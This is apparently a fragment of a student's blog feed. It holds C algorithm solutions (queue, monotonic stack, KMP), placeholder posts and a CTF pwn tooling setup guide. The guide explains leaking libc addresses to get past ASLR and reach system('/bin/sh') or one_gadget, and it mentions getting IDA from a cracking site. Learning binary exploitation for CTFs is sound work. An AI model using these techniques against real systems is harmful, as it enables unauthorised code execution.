class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> q[N], head = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    tail++;</span><br><span class="line">    q[tail] = x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pop</span><span class="params">()</span>&#123;</span><br><span class="line">    head++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">empty</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> head&gt;tail;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> q[head];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d\n&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;=n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, a);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;push&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">            <span class="comment">// printf(&quot;%d\n&quot;, x);</span></span><br><span class="line">            push(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;pop&quot;</span>))&#123;</span><br><span class="line">            pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(a, <span class="string">&quot;empty&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;YES\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, query());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五、单调栈">五、单调栈</h2><p>acwing 830单调栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="type">int</span> <span class="built_in">stack</span>[N], top = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - <span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">        <span class="keyword">while</span>(top &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">stack</span>[top] &gt;= e) top--;</span><br><span class="line">        <span class="keyword">if</span>(top &lt;= <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, <span class="built_in">stack</span>[top]);</span><br><span class="line">        top++;</span><br><span class="line">        <span class="built_in">stack</span>[top] = e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="六、单调队列">六、单调队列</h2><h2 id="七、KMP">七、KMP</h2><p>acwing 831 KMP字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> M 1000010</span></span><br><span class="line"><span class="type">char</span> p[N], s[M];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, p + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s + <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(p[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(s[i] == p[j + <span class="number">1</span>]) j++;</span><br><span class="line">        <span class="keyword">if</span>(j == n)&#123;</span><br><span class="line">            j = ne[j];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i - n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas使用</title>
      <link href="/2022/10/pandas/"/>
      <url>/2022/10/pandas/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data analysis </tag>
            
            <tag> pandas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>numpy使用</title>
      <link href="/2022/10/numpy/"/>
      <url>/2022/10/numpy/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> numpy </tag>
            
            <tag> data analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sort</title>
      <link href="/2022/10/sort/"/>
      <url>/2022/10/sort/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub</title>
      <link href="/2022/10/vulhub/"/>
      <url>/2022/10/vulhub/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crypto_1</title>
      <link href="/2022/10/crypto-1/"/>
      <url>/2022/10/crypto-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>android_develop_1</title>
      <link href="/2022/10/android-develop-1/"/>
      <url>/2022/10/android-develop-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_1</title>
      <link href="/2022/10/flask-1/"/>
      <url>/2022/10/flask-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> web </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>django_1</title>
      <link href="/2022/10/django-1/"/>
      <url>/2022/10/django-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> django </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React_1</title>
      <link href="/2022/10/react-1/"/>
      <url>/2022/10/react-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> React </tag>
            
            <tag> frontend </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA_1</title>
      <link href="/2022/10/DVWA-1/"/>
      <url>/2022/10/DVWA-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> web vuln </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web vuln </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链简介</title>
      <link href="/2022/10/blockchain/"/>
      <url>/2022/10/blockchain/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.824_1</title>
      <link href="/2022/10/MIT6-824-1/"/>
      <url>/2022/10/MIT6-824-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIT6.S081学习（一）</title>
      <link href="/2022/10/MIT6-S081-1/"/>
      <url>/2022/10/MIT6-S081-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golang学习（一）</title>
      <link href="/2022/10/golang1/"/>
      <url>/2022/10/golang1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNN</title>
      <link href="/2022/10/cnn/"/>
      <url>/2022/10/cnn/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> Neural Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Neural Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LSTM</title>
      <link href="/2022/10/lstm/"/>
      <url>/2022/10/lstm/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> Neural Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Neural Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semester学习（二）</title>
      <link href="/2022/10/missing-semester-2/"/>
      <url>/2022/10/missing-semester-2/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑回归分析</title>
      <link href="/2022/10/logistic-regression/"/>
      <url>/2022/10/logistic-regression/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习：线性回归</title>
      <link href="/2022/10/linear-regression/"/>
      <url>/2022/10/linear-regression/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>missing-semester学习（一）</title>
      <link href="/2022/10/missing-semester-1/"/>
      <url>/2022/10/missing-semester-1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> missing-semester </category>
          
      </categories>
      
      
        <tags>
            
            <tag> missing-semester </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh分析</title>
      <link href="/2022/10/ssh-analysis/"/>
      <url>/2022/10/ssh-analysis/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> network-security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPsec分析</title>
      <link href="/2022/10/IPsec-analysis/"/>
      <url>/2022/10/IPsec-analysis/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> network-sercurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network-sercurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ptmalloc源码分析</title>
      <link href="/2022/10/ptmalloc-analysis/"/>
      <url>/2022/10/ptmalloc-analysis/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>how2heap学习笔记（一）</title>
      <link href="/2022/10/how2heap1/"/>
      <url>/2022/10/how2heap1/</url>
      
        <content type="html"><![CDATA[<p>zsbd</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TODO_list</title>
      <link href="/2022/10/TODO-list/"/>
      <url>/2022/10/TODO-list/</url>
      
        <content type="html"><![CDATA[<p>访问速度不知道咋样，可能考虑挂个CDN<br>大概会再补充</p><h2 id="填坑">填坑</h2><ul><li>寄器学习，深度学习，神经网络</li><li>pwn未补完知识</li><li>大数据实验（为什么没有网安实验和软安实验，因为实在没有含金量，没活了可能会放上去）、阅读</li><li>how2heap学习</li><li>csapp</li><li>算法与数据结构</li><li>读书笔记</li><li>框架学习</li><li>moectf等wp（新生赛被新生打爆，悲）</li></ul><h2 id="开新坑">开新坑</h2><ul><li>基于LSTM的日志分析（论文太抽象了）</li><li>操作系统内核实验</li><li>学习过程中的做的项目</li><li>大二实验代码重构（屎山重构，悲）</li><li>CVE分析</li><li>各种课的lab</li><li>missing-semester</li><li>区块链</li></ul><h2 id="不能再写的东西">不能再写的东西</h2><ul><li>抽象文（太抽象了容易把别人吓到）</li></ul>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串</title>
      <link href="/2022/07/Format-String/"/>
      <url>/2022/07/Format-String/</url>
      
        <content type="html"><![CDATA[<p>把hexo的post_assert_folder打开了，下次一定好好传图😭😭😭<br>一般来说第一次加载比较慢，后续会好很多。（感谢缓存机制）<br>后续可能整个图床？</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu18及以上堆栈平衡的问题</title>
      <link href="/2022/07/some-problems-about-movaps/"/>
      <url>/2022/07/some-problems-about-movaps/</url>
      
        <content type="html"><![CDATA[<p>在做pwn题时常常遇到了明明填充数据长度和函数地址填写的都是对的，却总是打不进去的情况。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
            <tag> amd64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态链接过程</title>
      <link href="/2022/07/dynamic-linking/"/>
      <url>/2022/07/dynamic-linking/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出原理</title>
      <link href="/2022/07/stack-overflow/"/>
      <url>/2022/07/stack-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="栈的创建与销毁">栈的创建与销毁</h2><p>先复习一下栈的创建与销毁过程</p><h3 id="传参">传参</h3><p>x86下传参方式是将函数依次压入栈中。<br>如果一个函数声明为fun(arg1,arg2,arg3,arg4,…,argn),则在调用fun函数时，会使用<code>push</code>指令依次将argn,…,arg4,arg3,arg2,arg1压入栈中。<br>即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push argn</span><br><span class="line">……</span><br><span class="line">push arg1</span><br></pre></td></tr></table></figure><p>如果是linux/macos下的x64指令（windows好像有其他规定），则前6个参数依次放入rdi, rsi, rdx, rcx, r8, r9，从第七个参数开始按照x86的方式逆序入栈<br>若有一个函数fun(arg1,arg2,arg3,arg4,arg5,arg6…,argn)<br>arg1-&gt;%rdi,arg2-&gt;%rsi,arg3-&gt;%rdx,arg4-&gt;%rcx,arg5-&gt;%r8,arg6-&gt;%r9，<br>剩下的参数依次push进栈中。（有点类似于fastcall）<br>关于传参可以参考</p><h3 id="call-函数">call 函数</h3><p>call函数包含了两步</p><ul><li>将此时eip(或rip，即程序计数寄存器)中的值压入栈中。栈溢出常在此处做文章。</li><li>跳转到函数的执行位置。</li></ul><h3 id="push-ebp-rbp">push ebp(rbp)</h3><p>这一步是保存主调函数的</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn所需环境</title>
      <link href="/2022/07/pwn-environment/"/>
      <url>/2022/07/pwn-environment/</url>
      
        <content type="html"><![CDATA[<p>装新电脑需要配环境，就补一下。使用的环境是Ubuntu 22, 18和20的安装方法同下，16的环境试了很久，还是不行。<br>持续更新。用到的时候再补吧（咕咕咕）</p><h2 id="pwntools">pwntools</h2><p>直接用pip下载pwntools即可（注意关注pip版本）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>下载完可以在python中尝试导入pwn模块，没有报错就是胜利。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure><p>当然，下载完pwntools后，会有一些附带的有用工具，比如<code>checksec</code>。<br>checksec使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec file</span><br></pre></td></tr></table></figure><h2 id="IDA">IDA</h2><p>52破解上直接下。我这里直接下在本机上了。</p><h2 id="pwndbg">pwndbg</h2><p>pwndbg是调试工具gdb的一个插件，拥有更强大的功能<br>按照官方的安装方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>通常情况下，执行完上述命令后，使用<code>gdb</code>即可使用pwndbg。（毕竟pwndbg就是gdb的一个插件嘛）<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200425.png" alt="效果"><br>如果遇到gdb没有自动启用pwndbg的情况，可以用以下方法处理。<br>下图说明gdb没有启用pwndbg插件（进入原生的gdb）。<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200406.png" alt="效果"><br>在启动时，gdb通常会处理一个名为<code>.gdbinit</code>的初始化文件，gdb会在当前目录和home目录下寻找该初始化文件（home目录的优先级高于当前目录），并把它的内容作为gdb命令进行解释。<br>pwndbg在安装时会生成一个<code>.gdbinit</code>文件，用于加载执行pwndbg文件夹下的脚本。当我们使用<code>root</code>权限执行安装命令时，会在<code>/root</code>文件夹下生成<code>.gdbinit</code>文件，而用户文件夹下没有。<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200442.png" alt="查看"><br>因此我们只需要把<code>/root</code>下的<code>.gdbinit</code>复制到用户文件夹下即可。<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200534.png" alt="复制"><br>就可以使用pwndbg了。</p><h2 id="ROPgadget">ROPgadget</h2><p>ROPgadget是一款可以在二进制文件中搜索gadget的工具，可以便于我们实现ROP<br>因为ROPgadget基于python3开发，因此使用以下命令即可安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ROPgadget</span><br></pre></td></tr></table></figure><p>如果缺少库可以根据官方文档补充。<br>在安装过程中遇到了以下报错<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194511.png" alt="报错"><br>使用<code>find / -name ROPgadget</code>查找相关文件夹<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194523.png" alt="查找结果"><br>使用<code>cp -r</code>命令将<code>ROPgadget/scripts</code>文件夹复制到报错显示的文件夹下，即可解决问题<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194455.png" alt="解决"></p><h2 id="onegadget">onegadget</h2><p>使用以下命令安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><p>接着直接使用，即可直接查看<code>gadget</code>，通常我们查看<code>libc</code>文件，因为<code>libc</code>中存在的one_gadget（直接调用类似于<code>execve('/bin/sh', 0, 0)</code>的语句）比较多。不过需要注意的是，使用one_gadget往往需要满足特定的条件，因此需要耐心调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget file</span><br></pre></td></tr></table></figure><p>效果如下图,包含了one_gadget的偏移地址以及<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-24%20220241.png" alt="使用效果"></p><h2 id="LibcSearch">LibcSearch</h2><p>不如直接上网 <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> (打开比较慢)<br>因为在不同libc中，代码会有不同，因此库中的函数偏移量可能不同。函数的偏移量可以作为libc版本的特征，从而帮助我们推测出libc的版本。<br>页是linux内核管理物理内存的最小单位，内核将整个物理内存按照页对齐方式划分成千上万个页进行管理。因为linux内核中页对齐机制的存在，ASLR（地址随机化）不会影响低12位（linux中页的大小时4KB）。因此在攻击中，我们通常需要泄露部分函数的地址，取出后三字节，并依据这些信息，获取该函数在libc中的偏移量以及我们需要的特定函数与字符串的地址(<code>system('/bin/sh')</code>)。通过LibcSearch（或者说上面的网站）可以推测出较为准确的libc版本。<br>使用方法如下，只需要输入函数名称与后三字节即可。<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-12%20224505.png" alt="使用示例"></p><h2 id="Patchelf-glibc-all-in-one">Patchelf &amp;&amp; glibc-all-in-one</h2><p>经常会碰到因为libc版本不一致打不通的情况，这两个工具组合可以解决libc版本不一致的问题。<br><code>patchelf</code>直接apt安装即可，比较方便。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure><p><code>glibc-all-in-one</code>安装也比较方便，直接<code>git clone https://github.com/matrix1001/glibc-all-in-one.git</code>即可<br>使用<code>./update_list</code>更新List，接着使用<code>cat list</code>或<code>cat old_list</code>即可查看libc版本<br>下载是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./download libc_version</span><br></pre></td></tr></table></figure><p><code>patchelf</code>主要用来修改程序的链接路径或依赖库信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --set-rpath libc_path elf_path</span><br></pre></td></tr></table></figure><p>我在比赛中发现也可以这么改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --replace-needed libc.so.6 libc_path elf_path</span><br></pre></td></tr></table></figure><p>使用后可以使用<code>ldd</code>查看效果<br><img src="%E6%88%AA%E5%9B%BE%202024-09-24%2022-25-31.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 2</title>
